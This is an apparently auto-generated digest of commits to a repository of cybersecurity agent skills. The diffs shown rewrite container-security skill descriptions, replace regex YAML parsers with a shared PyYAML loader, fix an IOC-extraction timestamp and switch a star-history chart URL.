-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" width="100%" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date&theme=dark" />
+   <source media="(prefers-color-scheme: light)" srcset="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" />
+   <img alt="Star History Chart" src="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" width="100%" />
  </picture>
 </a>
 
```

---

### Incident Patch 5: `6972fe93` (2026-08-23)
**Commit Message**: docs(skills): rewrite container-security descriptions to a uniform standard

All 33 container-security skills now carry what it does, an explicit
"Use when" trigger, keywords, and a negative trigger naming the nearest
neighbour. Six collision clusters resolved by differentiating scope
rather than merging, so no skill is removed:

- kube-bench: running the tool vs interpreting findings into an audit
- Calico: portable upstream NetworkPolicy vs Calico-as-CNI vs Calico-only
  CRDs (GlobalNetworkPolicy, HostEndpoint, DNS egress)
- Falco: deploying and operating it vs authoring escape rules
- container escape: tool-agnostic runtime signals vs Falco rule syntax vs
  static posture audit vs offensive breakout
- Trivy: all-target platform and operator vs single-image scan
- Docker: images and Dockerfiles vs daemon.json vs the CIS audit script

Also replaces the templated "When to Use" boilerplate in these files,
including bullets that only restated the skill's own name.

Worst pair (Pod Security Standards vs Pod Security Admission) drops from
0.77 cosine to below the 0.45 threshold. Repo-wide: colliding pairs
60 -> 56, skills involved 105 -> 94.

**File**: `skills/analyzing-kubernetes-audit-logs/SKILL.md` (modified, +8/-4)
```diff
@@ -1,9 +1,13 @@
 ---
 name: analyzing-kubernetes-audit-logs
-description: 'Parses Kubernetes API server audit logs (JSON lines) to detect exec-into-pod,
-  secret access, RBAC modifications, privileged pod creation, and anonymous API access.
-  Builds threat detection rules from audit event patterns. Use when investigating
-  Kubernetes cluster compromise or building k8s-specific SIEM detection rules.
+description: >-
+  Parses Kubernetes API server audit logs (JSON lines) to detect exec-into-pod, secret access,
+  RBAC modifications, privileged pod creation, and anonymous API access, and builds SIEM
+  detection rules from the event patterns. Use when investigating a suspected cluster
+  compromise, reconstructing what an attacker did through the API server, or writing
+  Kubernetes-specific detection content. Keywords: audit policy, audit log, kube-apiserver,
+  exec into pod, RBAC change, anonymous access, detection rules. Do not use for syscall-level
+  detection inside a running container - use detecting-container-runtime-threats-with-falco.
 
   '
 domain: cybersecurity
```

**File**: `skills/auditing-kubernetes-rbac-privilege-escalation/SKILL.md` (modified, +8/-1)
```diff
@@ -1,6 +1,13 @@
 ---
 name: auditing-kubernetes-rbac-privilege-escalation
-description: Find over-permissive RBAC roles and service-account token abuse paths in Kubernetes using kubectl auth can-i, rbac-police, kubectl-who-can, and rakkess during authorized cluster security reviews.
+description: >-
+  Finds over-permissive RBAC roles and service-account token abuse paths in a Kubernetes
+  cluster using kubectl auth can-i, rbac-police, kubectl-who-can, and rakkess, tracing which
+  subjects can escalate toward cluster-admin. Use when reviewing who can escalate privileges
+  in a cluster, hunting exploitable RoleBindings during an authorized review, or validating
+  least privilege after an RBAC change. Keywords: RBAC, ClusterRoleBinding, service account
+  token, auth can-i, rbac-police, escalate, bind, impersonate. Do not use for designing and
+  applying hardened RBAC - use implementing-rbac-hardening-for-kubernetes.
 domain: cybersecurity
 subdomain: container-security
 tags:
```

**File**: `skills/benchmarking-kubernetes-with-kube-bench/SKILL.md` (modified, +9/-1)
```diff
@@ -1,6 +1,14 @@
 ---
 name: benchmarking-kubernetes-with-kube-bench
-description: Run kube-bench (Aqua Security) against a Kubernetes cluster's control-plane, kubelet, and node configuration to check compliance with the CIS Kubernetes Benchmark and remediate PASS/FAIL/WARN findings. Use when establishing a security baseline for a new cluster, performing periodic hardening audits, validating remediation after configuration changes, or gathering compliance evidence for SOC 2/PCI DSS.
+description: >-
+  Installs and runs the kube-bench tool against a Kubernetes cluster as a Job, DaemonSet, or
+  standalone binary, selecting the correct benchmark version and targets (control plane, etcd,
+  kubelet, worker nodes) and emitting JSON or JUnit output for pipelines. Use when setting
+  kube-bench up for the first time, choosing which benchmark version and node targets to run,
+  wiring it into CI, or troubleshooting skipped or misdetected checks. Keywords: kube-bench,
+  DaemonSet, --benchmark, --targets, JSON output, JUnit, CI integration. Do not use for
+  interpreting the findings or producing an audit report - use
+  performing-kubernetes-cis-benchmark-with-kube-bench.
 domain: cybersecurity
 subdomain: container-security
 tags:
```

**File**: `skills/detecting-container-drift-at-runtime/SKILL.md` (modified, +9/-1)
```diff
@@ -1,6 +1,14 @@
 ---
 name: detecting-container-drift-at-runtime
-description: Detect unauthorized runtime drift in containers by monitoring binary execution, file system changes, and configuration deviations from the original immutable image, using tools like Falco and Microsoft Defender for Kubernetes/container workloads. Use when investigating possible container compromise, validating immutable-infrastructure controls, or hunting for unexpected package installs and file modifications inside running containers.
+description: >-
+  Detects unauthorized runtime drift in containers by monitoring binary execution, filesystem
+  changes, and configuration deviation from the original immutable image, using Falco and
+  Microsoft Defender for Containers. Use when validating immutable-infrastructure controls,
+  hunting for unexpected package installs or binaries written inside a running container, or
+  determining whether a container diverged from the image it was built from. Keywords: drift,
+  immutable infrastructure, new binary executed, package install, image mismatch, Falco. Do
+  not use for detecting breakout from the container to the host - use
+  detecting-container-escape-attempts.
 domain: cybersecurity
 subdomain: container-security
 tags:
```

**File**: `skills/detecting-container-escape-attempts/SKILL.md` (modified, +10/-1)
```diff
@@ -1,6 +1,15 @@
 ---
 name: detecting-container-escape-attempts
-description: Detect container escape attempts where an adversary breaks out of container isolation to reach the host or other containers, by monitoring namespace manipulation, capability abuse, kernel exploits, sensitive mounted paths, and anomalous syscalls with tools like Falco, Sysdig, and seccomp/audit rules. Use when hunting for privilege escalation from containerized workloads or investigating suspected breakout from a Docker/Kubernetes environment.
+description: >-
+  Detects container escape at runtime across tooling - namespace manipulation, capability
+  abuse, kernel exploits, sensitive host mounts, and anomalous syscalls - and explains which
+  signals matter regardless of whether Falco, Sysdig, auditd, or an EDR is doing the
+  collection. Use when deciding what breakout behaviour to monitor, investigating a suspected
+  Docker or Kubernetes breakout, or comparing escape coverage across runtime sensors.
+  Keywords: container escape, breakout, namespaces, CAP_SYS_ADMIN, privileged, hostPath,
+  kernel exploit, syscall. Do not use for Falco rule syntax itself - use
+  detecting-container-escape-with-falco-rules; for a static configuration sweep use
+  performing-container-escape-detection.
 domain: cybersecurity
 subdomain: container-security
 tags:
```

---

### Incident Patch 6: `796d96c4` (2026-08-23)
**Commit Message**: fix: replace three hand-rolled YAML parsers with a shared PyYAML loader

index.json shipped 604 of 817 descriptions truncated to their first line.
The cause was the inline regex parser in update-index.yml: it reconstructed
multi-line descriptions only for the YAML block-scalar styles ('>' and '|')
and silently dropped continuation lines for every other style.

A census of the corpus explains the blast radius:

  block scalar   (description: >-)    43
  single-quoted multiline            278
  plain unquoted multiline           496
  single-line                          0

So 774 of 817 skills (94.7%) used a style the parser mishandled. Commit
d56fc0a7 had fixed only the 43 block-scalar files, and CONTRIBUTING.md
recommends that one working style, which is why it stayed hidden.

- add tools/skill_frontmatter.py, the single PyYAML-backed loader
- add tools/generate-index.py so generation is testable outside CI, with
  a --check mode for use as a gate
- delete the hand-rolled parsers from validate-skill.py (98 lines) and
  validate-agentskills.py, routing both through the shared loader
- implement the reserved-word check that agentskills-skill.schema.json
  names validate-agentskills.

**File**: `.github/workflows/update-index.yml` (modified, +8/-65)
```diff
@@ -18,72 +18,15 @@ jobs:
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Regenerate index.json
-        run: |
-          python3 << 'EOF'
-          import os, json, re
-          from datetime import datetime, timezone
-
-          skills_dir = "skills"
-          skills = []
-
-          for skill_name in sorted(os.listdir(skills_dir)):
-              skill_md = os.path.join(skills_dir, skill_name, "SKILL.md")
-              if not os.path.isfile(skill_md):
-                  continue
-              with open(skill_md, "r", encoding="utf-8") as f:
-                  content = f.read()
-              fm_match = re.match(r"^---\n(.*?)\n---", content, re.DOTALL)
-              description = ""
-              if fm_match:
-                  fm = fm_match.group(1)
-                  dm = re.search(r"^description:[ \t]*(.*)$", fm, re.MULTILINE)
-                  if dm:
-                      first = dm.group(1).strip()
-                      if first[:1] in (">", "|"):
-                          # YAML block scalar: gather the following more-indented lines
-                          buf = []
-                          for ln in fm[dm.end():].split("\n"):
-                              if ln.strip() == "":
-                                  buf.append("")
-                              elif re.match(r"^[ \t]+\S", ln):
-                                  buf.append(ln.strip())
-                              else:
-                                  break
-                          if first.startswith(">"):  # folded: blank line = break, else join w/ space
-                              paras, cur = [], []
-                              for b in buf:
-                                  if b == "":
-                                      if cur: paras.append(" ".join(cur)); cur = []
-                                  else:
-                                      cur.append(b)
-                              if cur: paras.append(" ".join(cur))
-                              description = " ".join(paras).strip()
-                          else:  # literal
-                              description = " ".join(b for b in buf if b).strip()
-                      else:
-                          description = first.strip('"').strip("'")
-              skills.append({
-                  "name": skill_name,
-                  "description": description,
-                  "domain": "cybersecurity",
-                  "path": f"skills/{skill_name}"
-              })
-
-          index = {
-              "version": "1.1.0",
-              "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
-              "repository": "https://github.com/mukul975/Anthropic-Cybersecurity-Skills",
-              "domain": "cybersecurity",
-              "total_skills": len(skills),
-              "skills": skills
-          }
-
-          with open("index.json", "w", encoding="utf-8") as f:
-              json.dump(index, f, separators=(',', ':'))
+      - name: Install dependencies
+        run: pip install pyyaml
 
-          print(f"Updated index.json: {len(skills)} skills")
-          EOF
+      # Generation lives in tools/generate-index.py so it is testable outside CI
+      # and shares one PyYAML-backed frontmatter parser with the validators.
+      # The previous inline regex parser silently truncated 604/817 descriptions
+      # to their first line for every YAML scalar style except '>'/'|'.
+      - name: Regenerate index.json
+        run: python3 tools/generate-index.py
 
       - name: Sync skill count into README and marketplace
         run: |
```

**File**: `tools/generate-index.py` (added, +109/-0)
```diff
@@ -0,0 +1,109 @@
+#!/usr/bin/env python3
+"""Generate index.json from the SKILL.md files under skills/.
+
+Previously this logic lived as an inline heredoc inside
+.github/workflows/update-index.yml with a hand-rolled regex YAML parser that
+truncated 604 of 817 descriptions. It lives here now so it is testable outside
+CI and shares one PyYAML-backed parser with every other tool.
+
+Usage:
+    python tools/generate-index.py            # write index.json
+    python tools/generate-index.py --check    # verify index.json is current (CI)
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import sys
+from datetime import datetime, timezone
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from skill_frontmatter import description_of, iter_skill_dirs, load_frontmatter, FrontmatterError
+
+INDEX_VERSION = "1.1.0"
+REPOSITORY = "https://github.com/mukul975/Anthropic-Cybersecurity-Skills"
+DEFAULT_DOMAIN = "cybersecurity"
+
+
+def build_index(skills_dir: str = "skills") -> tuple[dict, list[str]]:
+    """Build the index payload. Returns (index, errors)."""
+    skills = []
+    errors = []
+
+    for slug, skill_dir in iter_skill_dirs(skills_dir):
+        try:
+            frontmatter = load_frontmatter(os.path.join(skill_dir, "SKILL.md"))
+        except FrontmatterError as exc:
+            errors.append(f"{slug}: {exc}")
+            continue
+
+        description = description_of(frontmatter)
+        if not description:
+            errors.append(f"{slug}: empty description")
+
+        skills.append({
+            "name": slug,
+            "description": description,
+            "domain": frontmatter.get("domain") or DEFAULT_DOMAIN,
+            "path": f"{skills_dir}/{slug}",
+        })
+
+    index = {
+        "version": INDEX_VERSION,
+        "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "repository": REPOSITORY,
+        "domain": DEFAULT_DOMAIN,
+        "total_skills": len(skills),
+        "skills": skills,
+    }
+    return index, errors
+
+
+def _comparable(index: dict) -> str:
+    """Serialize an index ignoring generated_at, so --check tolerates a re-run."""
+    return json.dumps({k: v for k, v in index.items() if k != "generated_at"}, sort_keys=True)
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--check", action="store_true",
+                        help="verify index.json matches the skills tree; do not write")
+    parser.add_argument("--skills-dir", default="skills")
+    parser.add_argument("--out", default="index.json")
+    args = parser.parse_args()
+
+    if not os.path.isdir(args.skills_dir):
+        print(f"ERROR: '{args.skills_dir}' not found. Run from the repository root.")
+        return 1
+
+    index, errors = build_index(args.skills_dir)
+
+    for error in errors:
+        print(f"ERROR {error}")
+    if errors:
+        print(f"\n{len(errors)} skill(s) could not be indexed.")
+        return 1
+
+    if args.check:
+        if not os.path.isfile(args.out):
+            print(f"ERROR: {args.out} is missing. Run: python tools/generate-index.py")
+            return 1
+        with open(args.out, encoding="utf-8") as handle:
+            current = json.load(handle)
+        if _comparable(current) != _comparable(index):
+            print(f"ERROR: {args.out} is out of date. Run: python tools/generate-index.py")
+            return 1
+        print(f"OK: {args.out} is up to date ({index['total_skills']} skills)")
+        return 0
+
+    with open(args.out, "w", encoding="utf-8") as handle:
+        json.dump(index, handle, separators=(",", ":"))
+
+    print(f"Updated {args.out}: {index['total_skills']} skills")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
```

**File**: `tools/skill_frontmatter.py` (added, +119/-0)
```diff
@@ -0,0 +1,119 @@
+#!/usr/bin/env python3
+"""Single source of truth for reading SKILL.md YAML frontmatter.
+
+Every tool in this repository MUST read frontmatter through this module.
+
+Why this exists
+---------------
+This repo previously carried three independent hand-rolled "YAML-ish" parsers
+(the index generator, validate-skill.py, validate-agentskills.py). Each handled
+a different subset of YAML scalar styles, and all of them silently truncated
+multi-line descriptions to their first line.
+
+A census of the 817 skills shows why that was fatal:
+
+    block scalar   (description: >-)    43
+    single-quoted multiline            278
+    plain unquoted multiline           496
+    single-line                          0
+
+Only the 43 block-scalar files parsed correctly; 774 (94.7%) used a style the
+hand-rolled parsers mishandled, and 604 descriptions shipped truncated in
+index.json with no error and no warning.
+
+PyYAML handles every scalar style, quoting form and escape correctly. Do not
+reintroduce a regex-based frontmatter parser -- CI greps for that.
+"""
+from __future__ import annotations
+
+import os
+import re
+from typing import Dict, Iterator, Tuple
+
+import yaml
+
+# Frontmatter is the block between the opening '---' and the next '---' that
+# sits alone on its own line. Tolerates CRLF and a leading UTF-8 BOM.
+_FRONTMATTER_RE = re.compile(r"\A﻿?---[ \t]*\r?\n(.*?)\r?\n---[ \t]*(?:\r?\n|\Z)", re.DOTALL)
+
+BACKUP_SUFFIX = ".bak"
+
+
+class FrontmatterError(ValueError):
+    """Raised when a SKILL.md has missing or unparseable frontmatter."""
+
+
+def extract_block(text: str) -> str:
+    """Return the raw YAML frontmatter block from a SKILL.md's text."""
+    match = _FRONTMATTER_RE.match(text)
+    if not match:
+        raise FrontmatterError("no YAML frontmatter block (file must start with '---')")
+    return match.group(1)
+
+
+def parse(text: str) -> dict:
+    """Parse a SKILL.md's full text into a frontmatter dict."""
+    try:
+        data = yaml.safe_load(extract_block(text))
+    except yaml.YAMLError as exc:
+        raise FrontmatterError(f"invalid YAML in frontmatter: {exc}") from exc
+
+    if data is None:
+        return {}
+    if not isinstance(data, dict):
+        raise FrontmatterError(f"frontmatter must be a mapping, got {type(data).__name__}")
+    return data
+
+
+def load_frontmatter(skill_md_path: str) -> dict:
+    """Read one SKILL.md and return its frontmatter as a dict."""
+    try:
+        with open(skill_md_path, encoding="utf-8") as handle:
+            text = handle.read()
+    except UnicodeDecodeError as exc:
+        raise FrontmatterError(f"not valid UTF-8: {exc}") from exc
+    return parse(text)
+
+
+def description_of(frontmatter: dict) -> str:
+    """Return the description as a single normalized line.
+
+    YAML preserves the newlines of a literal ('|') scalar and folds a folded
+    ('>') one; collapsing whitespace here gives every style the same shape,
+    which is what index.json and the linters want to compare.
+    """
+    return " ".join(str(frontmatter.get("description", "")).split())
+
+
+def iter_skill_dirs(skills_dir: str = "skills") -> Iterator[Tuple[str, str]]:
+    """Yield (slug, skill_dir) for every real skill, in sorted order.
+
+    Skips '*.bak' backup directories and any directory lacking a SKILL.md.
+    """
+    for slug in sorted(os.listdir(skills_dir)):
+        if slug.endswith(BACKUP_SUFFIX):
+            continue
+        skill_dir = os.path.join(skills_dir, slug)
+        if not os.path.isdir(skill_dir):
+            continue
+        if not os.path.isfile(os.path.join(skill_dir, "SKILL.md")):
+            continue
+        yield slug, skill_dir
+
+
+def load_all(skills_dir: str = "skills") -> Tuple[Dict[str, dict], Dict[str, str]]:
+    """Load frontmatter for every skill.
+
+    Returns (frontmatter_by_slug, errors_by_slug). Callers decide whether a
+    parse failure is fatal; nothing is silently dropped.
+    """
+    loade
```

**File**: `tools/validate-agentskills.py` (modified, +29/-48)
```diff
@@ -13,82 +13,63 @@
 import os, re, sys, json, glob
 from collections import Counter
 
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from skill_frontmatter import description_of, load_frontmatter, FrontmatterError
+
 REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 ALLOWED = {"name", "description", "license", "compatibility", "metadata", "allowed-tools"}
 NAME_RE = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")
 
-def top_level_keys_and_scalars(fm):
-    """Minimal YAML: top-level keys (col 0) + scalar values for name/description."""
-    keys = []
-    scalars = {}
-    lines = fm.split("\n")
-    for i, line in enumerate(lines):
-        m = re.match(r"^([A-Za-z0-9_-]+):(.*)$", line)
-        if not m:
-            continue
-        key, rest = m.group(1), m.group(2)
-        keys.append(key)
-        val = rest.strip()
-        if val and val[0] in "|>":  # block scalar -> gather following indented lines
-            buf = []
-            for nxt in lines[i + 1:]:
-                if re.match(r"^\s+\S", nxt):
-                    buf.append(nxt.strip())
-                elif nxt.strip() == "":
-                    buf.append("")
-                else:
-                    break
-            val = " ".join(x for x in buf if x != "").strip()
-        elif not val:
-            # could be a folded plain scalar wrapped onto continuation lines
-            buf = []
-            for nxt in lines[i + 1:]:
-                if re.match(r"^\s+-\s", nxt) or re.match(r"^[A-Za-z0-9_-]+:", nxt):
-                    break
-                if re.match(r"^\s+\S", nxt):
-                    buf.append(nxt.strip())
-                else:
-                    break
-            val = " ".join(buf).strip()
-        scalars[key] = val.strip().strip("\"'")
-    return keys, scalars
+# The agentskills.io standard forbids reserved vendor words in a skill name.
+# tools/agentskills-skill.schema.json names this script as the enforcement
+# point, but the check was never actually implemented until now.
+RESERVED_NAME_WORDS = ("anthropic", "claude")
+
 
 def validate(path):
     slug = os.path.basename(os.path.dirname(path))
-    text = open(path, encoding="utf-8").read()
-    m = re.match(r"^---\n(.*?)\n---", text, re.DOTALL)
     problems = []
-    if not m:
-        return slug, ["no YAML frontmatter block"], []
-    fm = m.group(1)
-    keys, scalars = top_level_keys_and_scalars(fm)
+
+    try:
+        fm = load_frontmatter(path)
+    except FrontmatterError as exc:
+        return slug, [str(exc)], []
+
+    keys = list(fm.keys())
 
     if "name" not in keys:
         problems.append("missing required key: name")
     if "description" not in keys:
         problems.append("missing required key: description")
 
-    name = scalars.get("name", "")
+    name = str(fm.get("name", "") or "")
     if name:
         if not NAME_RE.match(name):
             problems.append(f"name not lowercase-kebab-case: {name!r}")
         if not (1 <= len(name) <= 64):
             problems.append(f"name length {len(name)} out of 1..64")
         if name != slug:
             problems.append(f"name {name!r} != directory {slug!r}")
+        for reserved in RESERVED_NAME_WORDS:
+            if reserved in name.lower():
+                problems.append(f"name contains reserved word {reserved!r}: {name!r}")
 
-    desc = scalars.get("description", "")
+    desc = description_of(fm)
     if desc:
         if not (1 <= len(desc) <= 1024):
             problems.append(f"description length {len(desc)} out of 1..1024")
     elif "description" in keys:
         problems.append("description empty")
 
-    # Ignore YAML block-scalar indicators (`key: >`, `key: >-`, `key: |`, ...);
-    # only genuine `<...>`/`>` content in values is an injection concern.
-    fm_no_ind = re.sub(r":[ \t]*[|>][+-]?[ \t]*(?=\n|$)", ":", fm)
-    if "<" in fm_no_ind or ">" in fm_no_ind:
-        problems.append("frontmatter contains angle brackets (injection risk / 
```

**File**: `tools/validate-skill.py` (modified, +7/-106)
```diff
@@ -10,6 +10,10 @@
 import sys
 import glob
 
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from skill_frontmatter import load_frontmatter, FrontmatterError
+
 # Kept in sync with the CI workflow (.github/workflows/validate-skills.yml),
 # which now delegates to this script so there is a single source of truth.
 REQUIRED_FIELDS = ["name", "description", "domain", "subdomain", "tags",
@@ -81,104 +85,6 @@
 RESET = "\033[0m"
 
 
-def parse_frontmatter(text):
-    """Extract YAML frontmatter as a dict (simple stdlib-only parser).
-
-    Handles the common SKILL.md patterns:
-    - key: scalar value
-    - key: [inline, list]
-    - key:\n  - list\n  - items
-    - key: >-  (folded scalar — content on following indented lines)
-
-    Edge case note: ``list_values`` is reset to ``[]`` whenever a new key
-    with a scalar value is encountered, so a list from a prior block cannot
-    leak into an unrelated key.  The only remaining theoretical edge case is
-    a key with *no* value that is immediately followed by non-list, non-empty
-    lines that look like scalars — those lines are currently ignored (the key
-    is treated as having no value).  This is acceptable for well-formed SKILL.md
-    files and matches the behaviour contributors expect.
-    """
-    if not text.startswith("---"):
-        return None
-    end = text.find("---", 3)
-    if end == -1:
-        return None
-    block = text[3:end].strip()
-    data = {}
-    current_key = None
-    list_values: list = []
-    in_folded = False  # True when we are collecting a YAML >- / > folded scalar
-    folded_lines: list = []
-
-    for line in block.split("\n"):
-        stripped = line.strip()
-
-        # Flush a completed folded scalar when we hit the next top-level key.
-        if in_folded and stripped and not line.startswith(" ") and not line.startswith("\t"):
-            if current_key and folded_lines:
-                data[current_key] = " ".join(folded_lines)
-            in_folded = False
-            folded_lines = []
-            current_key = None
-
-        if in_folded:
-            if stripped:
-                folded_lines.append(stripped)
-            continue
-
-        if not stripped or stripped.startswith("#"):
-            continue
-
-        # Handle list items (must come before key: value to avoid misparse).
-        if stripped.startswith("- ") and current_key:
-            list_values.append(stripped[2:].strip().strip('"').strip("'"))
-            data[current_key] = list(list_values)  # copy so future mutations don't leak
-            continue
-
-        # Only TOP-LEVEL keys (column 0) define frontmatter fields. An indented
-        # ``key: value`` line belongs to a nested structure (e.g. a framework
-        # mapping object that has its own ``name:``/``id:``) and must NOT be
-        # treated as a top-level field — otherwise a nested ``name:`` clobbers
-        # the skill's real ``name``.
-        if line[:1].isspace():
-            continue
-
-        # Handle inline list: tags: [a, b, c]
-        m = re.match(r"^(\w[\w_-]*):\s*\[(.+)\]\s*$", stripped)
-        if m:
-            current_key = m.group(1)
-            items = [i.strip().strip('"').strip("'") for i in m.group(2).split(",")]
-            data[current_key] = items
-            list_values = list(items)
-            continue
-
-        # Handle key: >- or key: > (folded scalar start)
-        m = re.match(r"^(\w[\w_-]*):\s*>[-|]?\s*$", stripped)
-        if m:
-            current_key = m.group(1)
-            list_values = []
-            in_folded = True
-            folded_lines = []
-            continue
-
-        # Handle key: value (plain scalar)
-        m = re.match(r'^(\w[\w_-]*):\s*(.*)$', stripped)
-        if m:
-            current_key = m.group(1)
-            val = m.group(2).strip().strip('"').strip("'")
-            list_values = []  # reset; new scalar key cannot inherit a prior list
-            if val:
-                data[curr
```

---

### Incident Patch 7: `4f4ec193` (2026-08-20)
**Commit Message**: Merge pull request #107 from ridaqp/fix/fileless-malware-attack-mapping

Fix ATT&CK mapping in detecting-fileless-malware-techniques

**File**: `skills/detecting-fileless-malware-techniques/SKILL.md` (modified, +4/-0)
```diff
@@ -32,8 +32,12 @@ nist_csf:
 mitre_attack:
 - T1027
 - T1055
+- T1059
+- T1112
 - T1140
+- T1218
 - T1497
+- T1546
 - T1547
 ---
 
```

---

### Incident Patch 8: `1a7cad8d` (2026-08-20)
**Commit Message**: Merge pull request #113 from farhan6667/fix/ioc-extraction-agent-report-timestamp

Fix always-empty timestamp in performing-malware-ioc-extraction agent.py report

**File**: `skills/performing-malware-ioc-extraction/scripts/agent.py` (modified, +2/-1)
```diff
@@ -5,6 +5,7 @@
 import argparse
 import re
 import hashlib
+from datetime import datetime, timezone
 from pathlib import Path
 
 
@@ -102,7 +103,7 @@ def generate_ioc_report(file_path, output=None):
     hashes = hash_file(file_path)
     strings = extract_strings(file_path)
     report = {
-        "generated": datetime.utcnow().isoformat() if "datetime" in dir() else "",
+        "generated": datetime.now(timezone.utc).isoformat(),
         "file_info": hashes,
         "strings_analysis": {
             "total": strings["total_strings"],
```

---

### Incident Patch 9: `7b8f4838` (2026-08-19)
**Commit Message**: README: fix broken star history chart

The star history chart in both READMEs no longer renders due to GitHub stargazer API restrictions. Switch the chart to a working mirror so the stargazer history displays again.

**File**: `README.fr.md` (modified, +1/-1)
```diff
@@ -346,7 +346,7 @@ Toutes les plateformes supportant le standard agentskills.io peuvent charger ces
 
 ## Historique des étoiles
 
-![Star History Chart](https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date)
+![Star History Chart](https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date)
 
 ## Releases
 
```

**File**: `README.md` (modified, +4/-4)
```diff
@@ -363,11 +363,11 @@ All platforms that support the [agentskills.io](https://agentskills.io) standard
 
 ## Star history
 
-<a href="https://star-history.com/#mukul975/Anthropic-Cybersecurity-Skills&Date">
+<a href="https://star-history.dera.page/#mukul975/Anthropic-Cybersecurity-Skills&Date">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" width="100%" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date&theme=dark" />
+   <source media="(prefers-color-scheme: light)" srcset="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" />
+   <img alt="Star History Chart" src="https://star-history.dera.page/svg?repos=mukul975/Anthropic-Cybersecurity-Skills&type=Date" width="100%" />
  </picture>
 </a>
 
```

---

### Incident Patch 10: `d56fc0a7` (2026-08-02)
**Commit Message**: Fix index.json generator to parse folded YAML descriptions

The generator's `^description:\s*(.+)$` regex captured the block-scalar
indicator (">-") instead of the wrapped text, corrupting 43 descriptions in
index.json. Parse `>`/`|` block scalars properly and regenerate (0 broken).
Also refresh the count-update comment examples 754 -> 817.

**File**: `.github/workflows/update-index.yml` (modified, +29/-5)
```diff
@@ -36,9 +36,33 @@ jobs:
               fm_match = re.match(r"^---\n(.*?)\n---", content, re.DOTALL)
               description = ""
               if fm_match:
-                  m = re.search(r"^description:\s*(.+)$", fm_match.group(1), re.MULTILINE)
-                  if m:
-                      description = m.group(1).strip().strip('"')
+                  fm = fm_match.group(1)
+                  dm = re.search(r"^description:[ \t]*(.*)$", fm, re.MULTILINE)
+                  if dm:
+                      first = dm.group(1).strip()
+                      if first[:1] in (">", "|"):
+                          # YAML block scalar: gather the following more-indented lines
+                          buf = []
+                          for ln in fm[dm.end():].split("\n"):
+                              if ln.strip() == "":
+                                  buf.append("")
+                              elif re.match(r"^[ \t]+\S", ln):
+                                  buf.append(ln.strip())
+                              else:
+                                  break
+                          if first.startswith(">"):  # folded: blank line = break, else join w/ space
+                              paras, cur = [], []
+                              for b in buf:
+                                  if b == "":
+                                      if cur: paras.append(" ".join(cur)); cur = []
+                                  else:
+                                      cur.append(b)
+                              if cur: paras.append(" ".join(cur))
+                              description = " ".join(paras).strip()
+                          else:  # literal
+                              description = " ".join(b for b in buf if b).strip()
+                      else:
+                          description = first.strip('"').strip("'")
               skills.append({
                   "name": skill_name,
                   "description": description,
@@ -80,8 +104,8 @@ jobs:
           with open("README.md", encoding="utf-8") as f:
               readme = f.read()
           readme = re.sub(r"(badge/skills-)\d+", rf"\g<1>{count}", readme)
-          # "754 production-grade", "754 structured", "754 skills", "all 754 skills",
-          # "Scans 754 skill", "contains **754 skills**", BibTeX "{754 structured"
+          # "817 production-grade", "817 structured", "817 skills", "all 817 skills",
+          # "Scans 817 skill", "contains **817 skills**", BibTeX "{817 structured"
           readme = re.sub(r"\b\d+(?=\s+production-grade cybersecurity skills)", str(count), readme)
           readme = re.sub(r"\b\d+(?=\s+structured cybersecurity skills)", str(count), readme)
           readme = re.sub(r"(all\s+)\d+(?=\s+skills)", rf"\g<1>{count}", readme)
```

#### Recent Merged Pull Requests:
- **PR #147** (closed): chore: normalize subdomains to canonical form and fix count drift (@brunoncaldas-collab)
- **PR #138** (closed): Fix dead navigation anchors in the French README (@gabrieldaltonPB)
- **PR #137** (closed): Fix dead AI RMF link, Navigator-asset claims, and stale releases table (@gabrieldaltonPB)
- **PR #136** (closed): Fix dead documentation links (verified replacements only) (@gabrieldaltonPB)
- **PR #135** (closed): Fix dead Navigator repo link and wrong Log4Shell CVE ID (@gabrieldaltonPB)
- **PR #134** (closed): Correct mislabelled OWASP Top 10 year (2025 -> 2021) (@gabrieldaltonPB)
- **PR #133** (closed): Fix broken script path, frontmatter schema, and dead links in copilot-instructions (@gabrieldaltonPB)
- **PR #129** (2026-08-24): gdpr compliance skill (@dakshverma23)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
